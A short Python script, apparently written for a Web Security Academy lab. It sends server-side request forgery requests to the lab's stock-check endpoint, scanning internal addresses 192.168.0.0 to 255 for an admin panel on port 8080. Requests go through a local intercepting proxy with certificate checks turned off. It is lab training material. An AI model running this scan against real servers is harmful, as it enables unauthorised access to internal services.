#!/usr/bin/python3
from traceback import print_tb
from urllib import response
import requests
import sys
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url = 'https://0a5d005804d029acc012d897007a00ab.web-security-academy.net/product/stock'

for i in range(256):
          headers = {"stockApi":"http://192.168.0.%d:8080/admin"%(i) }
          requests.post(url,headers=headers,proxies=proxies,verify=False)
          print("ok")
